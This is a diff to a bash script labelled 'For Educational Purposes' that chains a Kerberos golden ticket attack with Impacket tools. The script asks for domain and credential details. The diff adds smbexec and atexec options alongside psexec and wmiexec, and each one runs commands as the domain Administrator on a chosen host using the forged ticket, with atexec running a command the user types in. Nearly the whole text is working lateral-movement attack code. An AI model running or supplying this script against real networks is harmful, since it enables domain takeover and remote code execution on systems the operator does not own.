@@ -13,6 +13,8 @@ echo "# For Educational Purposes         #"
 echo "# GoldenTicket + Impacket          #"
 echo "####################################"
 
+#!/bin/bash
+
 read -p "Enter Domain IP: " domain_ip
 read -p "Enter Username: " user
 read -s -p "Enter Password: " password
@@ -89,13 +91,29 @@ read -p "Enter Device Name: " device
 echo "Choose the execution method:"
 echo "1) Psexec"
 echo "2) Wmiexec"
-read -p "Enter your choice (1-2): " choice
+echo "3) Smbexec"
+echo "4) Atexec"
+read -p "Enter your choice (1-4): " choice
 
 case $choice in
-    1) script_name="psexec.py" ;;
-    2) script_name="wmiexec.py" ;;
+    1)
+        script_name="psexec.py"
+        echo "Running $script_name..."
+        python3 /usr/share/doc/python3-impacket/examples/$script_name -dc-ip "$domain_ip" -target-ip "$target_ip" -no-pass -k "$domain/Administrator@$device.$domain"
+        ;;
+    2)
+        script_name="wmiexec.py"
+        echo "Running $script_name..."
+        python3 /usr/share/doc/python3-impacket/examples/$script_name -dc-ip "$domain_ip" -target-ip "$target_ip" -no-pass -k "$domain/Administrator@$device.$domain"
+        ;;
+    3)
+        echo "Running impacket-smbexec..."
+        impacket-smbexec -k -no-pass -dc-ip "$domain_ip" "$device.$domain"
+        ;;
+    4)
+        read -p "Enter Command (e.g., whoami): " command
+        echo "Running impacket-atexec..."
+        impacket-atexec -k -no-pass -dc-ip "$domain_ip" "$device.$domain" "$command"
+        ;;
     *) echo "Invalid choice"; exit 1 ;;
 esac
-
-echo "Running $script_name..."
-python3 /usr/share/doc/python3-impacket/examples/$script_name -dc-ip "$domain_ip" -target-ip "$target_ip" -no-pass -k "$domain/Administrator@$device.$domain"
